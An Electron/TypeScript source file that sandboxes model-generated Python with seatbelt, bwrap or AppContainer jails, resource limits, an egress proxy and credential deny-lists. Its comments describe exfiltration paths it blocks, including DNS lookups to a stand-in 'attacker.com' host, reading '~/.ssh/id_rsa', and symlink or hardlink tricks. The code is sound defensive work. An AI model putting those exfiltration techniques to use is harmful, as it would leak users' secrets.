import { app } from "electron";
import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import { createHash, randomUUID } from "node:crypto";
import { lstat, mkdir, readdir, readFile, rm, writeFile } from "node:fs/promises";
import { existsSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { startEgressProxy } from "./egressProxy";
import { ALLOW_HOSTS, buildScript } from "./wheels";
import { fontsDir, mplConfigDir } from "./runtime";
import { winJailCmd, winJailExe } from "./winJail";
import { ambientSecretDirs, ambientSecretFiles } from "../security/ambientSecrets"; import { BRAND } from "@openmasq/branding";
import { devOnly } from "../security/devOnly";

/**
 * Run model-generated Python in a jailed child process. The code can NOT write the
 * user's real files (writes confined to a per-run scratch dir) and its network is
 * forced through the loopback egress proxy, which allow-lists only {@link ALLOW_HOSTS}.
 *
 * ⚠️ Threat model (audit): the child runs DE-REDACTED code — the caller
 * (`mcpAgent` `p.fromWire`) restores the real values before execution so deliverables
 * hold the user's real data. So the sandbox DOES process real PII; egress + FS
 * confinement are LOAD-BEARING, not defence-in-depth. (The compensating control is
 * on the MODEL-facing side: run_python stdout is re-redacted before the model sees
 * it — that half is sound; the gap the jail must close is exfiltration.)
 */

const MAX_OUT = 200_000; // cap stdout/stderr chars
// Resource caps enforced on the sandboxed child via a `ulimit` wrapper (below), so a
// hostile/hallucinated snippet can't OOM or spin the machine even before the wall-clock
// timeout fires. ADDRESS-SPACE cap (`ulimit -v`, KB): honoured on Linux; best-effort on
// macOS (the kernel largely ignores -v, but it's harmless there). CPU-seconds cap is a
// hard backstop derived from the wall timeout.
const MAX_ADDRESS_SPACE_KB = 4 * 1024 * 1024; // 4 GB
/** Whether the sandbox child gets NO network at all.
 *  - `OPENMASQ_SANDBOX_NO_NET=1` forces it everywhere (max hardening).
 *  - Linux: NO network by DEFAULT (audit C-2). `--share-net` puts the child back in
 *    the host netns where egress is only enforced by cooperative HTTPS_PROXY env vars,
 *    which a raw `socket.connect()` bypasses — so on Linux the "market-data only" claim
 *    is unenforceable. Opt back in with `OPENMASQ_SANDBOX_LINUX_NET=1` (accepting that
 *    egress is not netns-restricted).
 *  macOS keeps network on: the seatbelt profile HARD-restricts outbound to the loopback
 *  proxy port at the kernel level, so egress really is market-data only.
 *  TODO(security) C-2: netns egress filtering (pasta/nftables) → then default Linux net on. */
const noNetwork = (): boolean => {
  if (process.env.OPENMASQ_SANDBOX_NO_NET === "1") return true;
  if (process.platform === "linux" && devOnly(process.env.OPENMASQ_SANDBOX_LINUX_NET) !== "1") return true;
  // win32: ALWAYS, and not as a policy choice — see `winJail.ts` (an AppContainer with no
  // capability has no socket at all, so there is nothing an env var could re-open).
  if (process.platform === "win32") return true;
  return false;
};
const MAX_IMAGES = 8;
const MAX_IMG_BYTES = 6 * 1024 * 1024;
const MAX_FILES = 8;
const MAX_FILE_BYTES = 25 * 1024 * 1024; // a generated PDF/xlsx can be a few MB

/** Extensions the code runner is allowed to hand back as a DELIVERABLE file (a report
 *  the model generated). Curated so junk/temp binaries aren't surfaced; images go
 *  through the figure path instead. */
const OUTPUT_MIME: Record<string, string> = {
  ".pdf": "application/pdf",
  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  ".xls": "application/vnd.ms-excel",
  ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  ".pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  ".csv": "text/csv",
  ".tsv": "text/tab-separated-values",
  ".json": "application/json",
  ".txt": "text/plain",
  ".md": "text/markdown",
  ".html": "text/html",
  ".zip": "application/zip",
};

export interface PythonResult {
  ok: boolean;
  stdout: string;
  stderr: string;
  images: { name: string; base64: string }[];
  /** DELIVERABLE files the code wrote to the output dir (PDF/xlsx/docx/…), captured
   *  and handed back to the user (saved + pinned as a chip on the assistant message). */
  files: { name: string; base64: string; mime: string }[];
}

export type Jail = "seatbelt" | "bwrap" | "appcontainer" | "none";

const has = (cmd: string): boolean => {
  try {
    return spawnSync(cmd, ["--version"], { stdio: "ignore" }).status !== null;
  } catch {
    return false;
  }
};

/** Which OS jail will actually wrap the child on this machine. */
export function jailAvailability(): Jail {
  if (process.platform === "darwin") return "seatbelt"; // sandbox-exec ships with macOS
  if (process.platform === "linux") return has("bwrap") ? "bwrap" : "none";
  if (process.platform === "win32") return existsSync(winJailExe()) ? "appcontainer" : "none";
  return "none";
}

/** The at-rest secret files/dirs the sandbox child must NOT read. `file-read*` is broad
 *  (python needs stdlib/dylibs), so the crown-jewels are DENY-listed explicitly. Two
 *  tiers:
 *   • the app's OWN userData secrets — the conversation vault DB (placeholder→real for
 *     EVERY conversation), the encrypted key material, the MCP token store (audit H-10);
 *   • the USER's ambient credentials elsewhere on disk (audit H-3): the de-redacted,
 *     possibly injection-steered code could otherwise `open("~/.ssh/id_rsa")`, cloud/CLI
 *     tokens, browser cookie stores, keychains — content the model has no business
 *     reading and which is NOT covered by the vault re-redaction (only KNOWN PII is
 *     re-masked in stdout, so novel secret bytes would reach the external model). We
 *     leave the rest of `/` readable (python needs the runtime + system libs) but mask
 *     these high-value credential locations. NOT a full minimal-allow-list jail — that
 *     remains the follow-up — but it neutralises the concrete exfil paths. */
/**
 * The dirs UNDER userData the jailed run legitimately needs (read + write): the Python
 * runtime (dev downloads the interpreter here; the per-run scratch lives under it) and the
 * persistent matplotlib cache. Everything ELSE under userData is a secret (see {@link
 * secretPaths}) — these are carved BACK IN after the blanket userData deny.
 */
export function sandboxReadCarveOuts(): string[] {
  const u = app.getPath("userData");
  return [join(u, "python"), join(u, "python-cache")];
}

export function secretPaths(): { dirs: string[]; files: string[] } {
  const u = app.getPath("userData");
  return {
    // Audit M7: deny the WHOLE userData subtree (parity with the FS-MCP `fsDenyPaths`),
    // not just `accounts/` — it also holds `broker/` (CDP secret), `agent-browser/` (the
    // authenticated-SaaS cookies), `files/` (saved file blobs, plaintext in dev/no-keyring),
    // `mcp.json`, and every `*.enc`. A blanket deny also covers any FUTURE secret added
    // here. The runtime/scratch/mpl-cache are carved back in ({@link sandboxReadCarveOuts}).
    // The user's AMBIENT credential stores (audit H-3) are the SHARED set the FS-MCP gate
    // masks too — one source (`security/ambientSecrets.ts`, root rule 9) so the two can't drift.
    dirs: [u, ...ambientSecretDirs()],
    files: ambientSecretFiles(),
  };
}

/** macOS seatbelt profile: read broadly (python needs stdlib/dylibs) EXCEPT the userData
 *  secrets (audit H-10), write ONLY the per-run scratch + the (writable, userData)
 *  matplotlib cache — the Python RUNTIME is NOT writable — and allow network ONLY to the
 *  loopback egress proxy (or nothing at all under {@link noNetwork}). */
export function seatbeltProfile(scratch: string, proxyPort: number): string {
  const secrets = secretPaths();
  return [
    "(version 1)",
    "(deny default)",
    "(allow process-fork)",
    "(allow process-exec*)",
    "(allow file-read*)",
    // Later rules win in SBPL → carve the secret vault/keys/tokens back out of the
    // broad read-allow so de-redacted code can't slurp them (audit H-10 / M7). The whole
    // userData is now denied, so RE-ALLOW read of the runtime + scratch + mpl-cache that
    // live under it (later rule wins), else the interpreter itself becomes unreadable.
    ...secrets.dirs.map((d) => `(deny file-read* (subpath "${d}"))`),
    ...secrets.files.map((f) => `(deny file-read* (literal "${f}"))`),
    ...sandboxReadCarveOuts().map((d) => `(allow file-read* (subpath "${d}"))`),
    // The userData DIRECTORY NODE itself sits inside the blanket `subpath` deny, and the
    // carve-outs above only re-open what's strictly BELOW `userData/python`. SQLite's
    // `unixFullPathname` lstat()s EVERY component of a DB path — it hits the userData
    // node → EPERM → SQLITE_CANTOPEN ("unable to open database file") for ANY file DB in
    // the scratch, which silently broke every yfinance fetch (its cookie/tz cache is
    // SQLite). Re-allow METADATA of that one node, `literal` on purpose: stat/lstat of
    // the folder itself (dates/perms), zero read access to anything inside it — the
    // children stay under the deny. Pinned in `sandbox.test.ts`.
    `(allow file-read-metadata (literal "${app.getPath("userData")}"))`,
    `(allow file-write* (subpath "${scratch}") (subpath "${mplConfigDir()}"))`,
    "(allow file-write-data (subpath \"/dev\"))",
    // Egress: ONLY the loopback proxy port, or — in max-hardening mode — nothing.
    ...(noNetwork() ? [] : [`(allow network-outbound (remote ip "localhost:${proxyPort}"))`]),
    "(allow mach-lookup)",
    // …but NOT the DNS resolver: `mach-lookup` to mDNSResponder is an off-box DNS
    // exfiltration channel (`getaddrinfo("<secret>.attacker.com")`) that the
    // network-outbound rule can't see. The child needs no DNS — the egress proxy
    // resolves the allow-listed host itself (audit M-6).
    '(deny mach-lookup (global-name "com.apple.mDNSResponder"))',
    '(deny mach-lookup (global-name "com.apple.mDNSResponderHelper"))',
    '(deny mach-lookup (global-name "com.apple.dnssd.service"))',
    "(allow sysctl-read)",
    "(allow signal (target self))",
  ].join("\n");
}

/** Every temp-dir env a jailed run needs pointed INSIDE the scratch: the jail denies
 *  /tmp|/var/tmp|/usr/tmp|the darwin per-user temp, so anything probing a temp dir —
 *  SQLite's journal/temp store (even for `:memory:`), Python `tempfile`, requests_cache —
 *  fails without these. `SQLITE_TMPDIR` is read by SQLite's unix VFS ahead of `TMPDIR`.
 *  Must be set at SPAWN: SQLite resolves it from the process's starting environment. */
export function sandboxTempEnv(tmpDir: string): Record<string, string> {
  return { TMPDIR: tmpDir, TMP: tmpDir, TEMP: tmpDir, SQLITE_TMPDIR: tmpDir };
}

/** Build the argv that runs `pythonBin main.py` under the platform jail. Exported for the
 *  same reason as {@link seatbeltProfile}: a jail IS its argv (`winJail.test.ts`). */
export function jailedCmd(
  pythonBin: string,
  mainPy: string,
  scratch: string,
  proxyPort: number,
): { cmd: string; args: string[] } {
  const jail = jailAvailability();
  if (jail === "seatbelt") {
    return { cmd: "sandbox-exec", args: ["-p", seatbeltProfile(scratch, proxyPort), pythonBin, mainPy] };
  }
  if (jail === "bwrap") {
    const secrets = secretPaths();
    return {
      cmd: "bwrap",
      args: [
        "--ro-bind", "/", "/", // whole FS READ-ONLY → the Python runtime can't be mutated
        // Mask every deny-listed secret (audit H-10 + H-3): an empty tmpfs over each
        // secret DIR that exists (the app's accounts/ vault DBs + token store, and the
        // user's ~/.ssh /.aws /.gnupg / cloud-CLI / browser-profile credential dirs) and
        // /dev/null over each secret FILE that exists (*.enc keys, .netrc/.npmrc/.pypirc/
        // .git-credentials, shell histories). Only existing paths are masked (bwrap errors
        // on a missing bind target).
        ...secrets.dirs.filter((d) => existsSync(d)).flatMap((d) => ["--tmpfs", d]),
        ...secrets.files.filter((f) => existsSync(f)).flatMap((f) => ["--ro-bind", "/dev/null", f]),
        // userData is now blanket-masked (audit M7) → re-expose ONLY the runtime + mpl-cache
        // that live under it (later binds layer over the tmpfs), else python can't run / plot.
        ...sandboxReadCarveOuts().filter((d) => existsSync(d)).flatMap((d) => ["--ro-bind", d, d]),
        // TODO(security): tighten `--ro-bind / /` to a minimal path set (bind only the
        // runtime + system libs, leave $HOME/userData unmounted) rather than mask-listing.
        "--bind", scratch, scratch,
        // The persistent matplotlib cache lives in (writable) userData, OUTSIDE the
        // read-only-bound tree; bind it rw so a run can refresh/build fontlist-*.json.
        // Normally pre-warmed at install → runs only READ it.
        "--bind", mplConfigDir(), mplConfigDir(),
        "--dev", "/dev",
        "--proc", "/proc",
        "--unshare-all", // new user/ipc/pid/uts/cgroup/net namespaces…
        // …then RE-share net ONLY when egress is allowed, so the loopback proxy is
        // reachable; under max-hardening (noNetwork) the child has NO network at all.
        // NOTE: `--share-net` gives full outbound (egress is proxy-enforced via HTTPS_PROXY
        // + no other route on macOS seatbelt); per-host netns filtering (pasta/nftables) is
        // a documented follow-up — the correct, always-working hard mode here is no-net.
        ...(noNetwork() ? [] : ["--share-net"]),
        "--cap-drop", "ALL", // drop every capability inside the sandbox
        "--new-session", // detach controlling TTY (blocks TIOCSTI terminal injection)
        "--die-with-parent",
        pythonBin, mainPy,
      ],
    };
  }
  // The memory ceiling is the SAME number the POSIX cage uses — one source, two shapes
  // (`ulimit -v` in KB there, a Job Object limit in MB here).
  if (jail === "appcontainer") {
    return winJailCmd(pythonBin, mainPy, scratch, Math.floor(MAX_ADDRESS_SPACE_KB / 1024));
  }
  return { cmd: pythonBin, args: [mainPy] }; // no jail: refused upstream by runPython
}

/** Wrap a command in a POSIX `ulimit` cage: a CPU-seconds cap (hard backstop past the
 *  wall-clock timeout) + an address-space cap, so a runaway/hostile snippet can't peg the
 *  CPU or exhaust memory. Uses `exec "$@"` so no extra process lingers. No-op on win32 —
 *  not a gap: the Windows jail launcher applies the same caps through a Job Object (`winJail.ts`). */
function withRlimits(cmd: string, args: string[], cpuSecs: number): { cmd: string; args: string[] } {
  if (process.platform === "win32") return { cmd, args };
  // Process-count cap (audit M9): bounds a fork-bomb. RLIMIT_NPROC is per-real-UID, so a
  // low cap is UNSAFE on macOS (it counts ALL the user's processes → could starve the run
  // if the user already has many). Under bwrap's `--unshare-all` the child gets a NEW user
  // namespace, so the count is isolated to the sandbox → a cap is both safe and effective
  // there. Apply it on Linux only; macOS relies on the OS-default per-UID ceiling + the 60s
  // wall-clock SIGKILL of the whole tree.
  const nproc = process.platform === "linux" ? " ulimit -u 256 2>/dev/null;" : "";
  const script = `ulimit -t ${cpuSecs} 2>/dev/null;${nproc} ulimit -v ${MAX_ADDRESS_SPACE_KB} 2>/dev/null; exec "$@"`;
  return { cmd: "/bin/sh", args: ["-c", script, "sh", cmd, ...args] };
}

/** Read a COLLECTED deliverable/figure file safely (audit M3). The collectors run in
 *  the UNJAILED main process, so a symlink the jailed child dropped in the output dir
 *  (`out/x.pdf` → `…/accounts/openmasq-<uid>.db`, or `~/.ssh/id_rsa`) would be FOLLOWED and
 *  the secret handed back as a "deliverable", defeating the seatbelt/bwrap read-deny. Reject
 *  anything that isn't a real REGULAR file (lstat, so a symlink is not dereferenced for the
 *  type test) and any name with a path separator (readdir yields basenames, but defence). */
async function readCollected(dir: string, name: string, maxBytes: number): Promise<Buffer | null> {
  if (name.includes("/") || name.includes("\\") || name.includes("\0")) return null;
  const full = join(dir, name);
  try {
    const st = await lstat(full);
    // symlink/dir/fifo, too big, OR a HARDLINK (nlink>1, audit M3 residual): a jailed child
    // can create `out/x.pdf` as a hardlink to `accounts/vault.db` — lstat sees a regular
    // file, but nlink>1 reveals it aliases another path (a real deliverable it just wrote
    // has nlink 1). Refuse it so the unjailed collector can't hand back a secret.
    if (!st.isFile() || st.size > maxBytes || st.nlink > 1) return null;
    return await readFile(full);
  } catch {
    return null;
  }
}

function killTree(child: ChildProcess): void {
  try {
    if (process.platform === "win32" && child.pid) {
      spawnSync("taskkill", ["/pid", String(child.pid), "/T", "/F"], { stdio: "ignore" });
    } else if (child.pid) {
      // Kill the whole PROCESS GROUP (audit M9): the child is spawned `detached` (own pgid),
      // so `-pid` reaches python's forked grandchildren too — on macOS (no PID namespace) a
      // fork-bomb / backgrounded child otherwise orphans and survives the wall-clock kill.
      // Fall back to killing just the child if the group signal fails (already gone / no pgid).
      try {
        process.kill(-child.pid, "SIGKILL");
      } catch {
        child.kill("SIGKILL");
      }
    } else {
      child.kill("SIGKILL");
    }
  } catch {
    /* already gone */
  }
}

/** Collect saved figures (`fig_*.png`) as base64, bounded in count and size. */
async function collectImages(figDir: string): Promise<{ name: string; base64: string }[]> {
  const out: { name: string; base64: string }[] = [];
  const names = (await readdir(figDir).catch(() => []))
    .filter((n) => n.toLowerCase().endsWith(".png"))
    .sort()
    .slice(0, MAX_IMAGES);
  for (const name of names) {
    const bytes = await readCollected(figDir, name, MAX_IMG_BYTES);
    if (bytes) out.push({ name, base64: bytes.toString("base64") });
  }
  return out;
}

const extOf = (name: string): string => {
  const i = name.lastIndexOf(".");
  return i < 0 ? "" : name.slice(i).toLowerCase();
};

/** A deliverable generated EARLIER in the conversation, seeded into the run's CWD so
 *  the code can LOAD and MODIFY it (« enrichis le rapport ») instead of starting over. */
export interface SeedFile {
  name: string;
  base64: string;
}

const sha256 = (bytes: Buffer): string => createHash("sha256").update(bytes).digest("hex");

/** Extensions accepted as SEEDS only, never collected as deliverables: the
 *  conversation's working SCRIPT (`analyse.py`) re-enters the CWD so the code can
 *  exec/iterate on it, but a `.py` the run writes is scaffolding, not a deliverable. */
const SEED_ONLY_EXT = new Set([".py"]);

/** Sanitize renderer-supplied seed files in MAIN (the renderer is untrusted — rule 7):
 *  BASENAME only (no separators/`..`/dotfiles), the collector's deliverable-extension
 *  allow-list (+ {@link SEED_ONLY_EXT}), bounded count + size; anything suspicious is
 *  DROPPED. */
export function sanitizeSeedFiles(files: unknown): { name: string; bytes: Buffer }[] {
  if (!Array.isArray(files)) return [];
  const out: { name: string; bytes: Buffer }[] = [];
  const seen = new Set<string>();
  for (const f of files as { name?: unknown; base64?: unknown }[]) {
    if (out.length >= MAX_FILES) break;
    if (!f || typeof f.name !== "string" || typeof f.base64 !== "string") continue;
    const name = f.name;
    if (name.includes("/") || name.includes("\\") || name.includes("\0") || name.startsWith(".")) continue;
    if (!(OUTPUT_MIME[extOf(name)] || SEED_ONLY_EXT.has(extOf(name))) || seen.has(name)) continue;
    const bytes = Buffer.from(f.base64, "base64");
    if (!bytes.length || bytes.length > MAX_FILE_BYTES) continue;
    seen.add(name);
    out.push({ name, bytes });
  }
  return out;
}

/** Collect DELIVERABLE files the code wrote to the (clean, dedicated) output dir —
 *  only curated document extensions, bounded in count + size. A SEEDED file whose
 *  bytes are UNCHANGED is skipped (it was already delivered in a previous turn);
 *  a modified one comes back as a fresh deliverable. */
async function collectFiles(
  outDir: string,
  seeded: Map<string, string> = new Map(),
): Promise<{ name: string; base64: string; mime: string }[]> {
  const out: { name: string; base64: string; mime: string }[] = [];
  const names = (await readdir(outDir).catch(() => [])).filter((n) => OUTPUT_MIME[extOf(n)]).sort();
  for (const name of names) {
    if (out.length >= MAX_FILES) break;
    const bytes = await readCollected(outDir, name, MAX_FILE_BYTES);
    if (!bytes) continue;
    if (seeded.get(name) === sha256(bytes)) continue; // unchanged seed → not a new deliverable
    out.push({ name, base64: bytes.toString("base64"), mime: OUTPUT_MIME[extOf(name)] });
  }
  return out;
}

/** Run `code` in the jailed venv python; returns stdout/stderr + any PNG figures.
 *  `seedFiles` (deliverables generated earlier in the conversation) are written into
 *  the run's CWD after main-side sanitization, so the code can load + modify them. */
export async function runPython(
  code: string,
  opts: {
    pythonBin: string;
    timeoutMs?: number;
    onStdout?: (chunk: string) => void;
    seedFiles?: SeedFile[];
  },
): Promise<PythonResult> {
  // HARD GATE (audit C-1): never run model-generated, DE-REDACTED code with NO jail.
  // `jailAvailability()` is "none" on Linux without bwrap, and on Windows when
  // the jail launcher is missing from the bundle — running bare there would give untrusted
  // code the user's real data + full FS/network with their own privileges. Refuse unless
  // the user explicitly accepts the risk with OPENMASQ_PYTHON_UNSAFE=1.
  if (jailAvailability() === "none" && devOnly(process.env.OPENMASQ_PYTHON_UNSAFE) !== "1") {
    return {
      ok: false,
      stdout: "",
      stderr:
        `[${BRAND.name}] Interpréteur Python désactivé sur cette plateforme : aucun bac à sable disponible ` +
        "(exécuter du code non fiable sans isolation exposerait vos données). " +
        "Définissez OPENMASQ_PYTHON_UNSAFE=1 pour l'exécuter sans isolation (déconseillé).",
      images: [],
      files: [],
    };
  }
  const scratch = join(app.getPath("userData"), "python", "runs", randomUUID());
  const figDir = join(scratch, "figures");
  // A DEDICATED, clean output dir = the child's CWD, so a file the model saves with a
  // relative name (`pdf.output("rapport.pdf")`) lands here and is captured — without
  // sweeping up scaffolding (main.py).
  const outDir = join(scratch, "out");
  // A WRITABLE temp dir INSIDE the jail. The seatbelt/bwrap jail denies /tmp, /var/tmp,
  // /usr/tmp AND the macOS per-user darwin temp (`/var/folders/…/T`), and TMPDIR is unset
  // — so anything probing the temp dir (SQLite's journal/temp store, tempfile.mkdtemp,
  // requests_cache) fails. SQLite is the sharp edge: yfinance opens a SQLite cookie/tz/ISIN
  // cache and, with no reachable temp dir, EVERY fetch dies with "unable to open database
  // file" → an empty DataFrame for every ticker (the reported "yfinance ne renvoie rien").
  // A scratch-local temp dir is already jail-writable (it's under `scratch`), so pointing
  // the temp-dir envs here fixes it with ZERO widening of the jail. Verified end-to-end in
  // `sandbox.test.ts` (a real SQLite open succeeds).
  const tmpDir = join(scratch, "tmp");
  // PERSISTENT matplotlib cache — NOT in scratch (which is wiped each run), so the font
  // cache is built once (pre-warmed at install) and reused, never rebuilt per run.
  const mplDir = mplConfigDir();
  await mkdir(figDir, { recursive: true });
  await mkdir(outDir, { recursive: true });
  await mkdir(tmpDir, { recursive: true });
  await mkdir(mplDir, { recursive: true });
  // Seed prior deliverables into the CWD (sanitized in MAIN, never trusted from the
  // renderer) and remember each seed's hash: an unchanged seed is NOT re-collected.
  const seeded = new Map<string, string>();
  for (const f of sanitizeSeedFiles(opts.seedFiles)) {
    await writeFile(join(outDir, f.name), f.bytes);
    seeded.set(f.name, sha256(f.bytes));
  }
  writeFileSync(join(scratch, "main.py"), buildScript(code), "utf8");
  const mainPy = join(scratch, "main.py");

  const proxy = await startEgressProxy(ALLOW_HOSTS);
  const proxyUrl = `http://127.0.0.1:${proxy.port}`;
  const timeoutMs = opts.timeoutMs ?? 60_000;
  // CPU-seconds backstop = the wall timeout + a margin (multi-core work can burn CPU
  // faster than wall time; the setTimeout below is the primary kill).
  const cpuSecs = Math.ceil(timeoutMs / 1000) + 30;
  const jailed = jailedCmd(opts.pythonBin, mainPy, scratch, proxy.port);
  const { cmd, args } = withRlimits(jailed.cmd, jailed.args, cpuSecs);

  const env: NodeJS.ProcessEnv = {
    PATH: process.env.PATH ?? "",
    HOME: scratch,
    ...sandboxTempEnv(tmpDir),
    OPENMASQ_FIG_DIR: figDir,
    OPENMASQ_FONT_DIR: fontsDir(),
    MPLBACKEND: "Agg",
    MPLCONFIGDIR: mplDir,
    PYTHONDONTWRITEBYTECODE: "1",
    HTTPS_PROXY: proxyUrl,
    HTTP_PROXY: proxyUrl,
    https_proxy: proxyUrl,
    http_proxy: proxyUrl,
    // yfinance 0.2.65 uses curl_cffi (libcurl). libcurl honours https_proxy but some
    // paths only consult ALL_PROXY/all_proxy — set both so EVERY client (requests +
    // curl_cffi) routes through the loopback egress proxy (the jail blocks any socket
    // that doesn't, so a missed proxy env = a silent connection failure = zero data).
    ALL_PROXY: proxyUrl,
    all_proxy: proxyUrl,
    NO_PROXY: "",
  };

  const result = await new Promise<PythonResult>((resolve) => {
    let stdout = "";
    let stderr = "";
    let timedOut = false;
    // `detached` on posix → the child leads its OWN process group, so `killTree` can
    // SIGKILL the whole group (`-pid`) incl. forked grandchildren on the timeout (audit M9).
    const child = spawn(cmd, args, {
      cwd: outDir,
      env,
      stdio: ["ignore", "pipe", "pipe"],
      detached: process.platform !== "win32",
    });
    const timer = setTimeout(() => {
      timedOut = true;
      killTree(child);
    }, timeoutMs);

    child.stdout?.on("data", (d) => {
      const s = String(d);
      if (stdout.length < MAX_OUT) stdout += s;
      opts.onStdout?.(s); // live progress → the chat indicator
    });
    child.stderr?.on("data", (d) => {
      if (stderr.length < MAX_OUT) stderr += String(d);
    });
    child.on("error", (e) => {
      clearTimeout(timer);
      resolve({ ok: false, stdout, stderr: `${stderr}\n${e.message}`, images: [], files: [] });
    });
    child.on("close", async (codeNum) => {
      clearTimeout(timer);
      const [images, files] = await Promise.all([
        collectImages(figDir),
        collectFiles(outDir, seeded),
      ]);
      if (timedOut) stderr += `\n[${BRAND.name}] délai dépassé (${timeoutMs} ms) — interrompu.`;
      resolve({ ok: !timedOut && codeNum === 0, stdout: stdout.slice(0, MAX_OUT), stderr: stderr.slice(0, MAX_OUT), images, files });
    });
  });

  proxy.close();
  await rm(scratch, { recursive: true, force: true }).catch(() => {});
  return result;
}
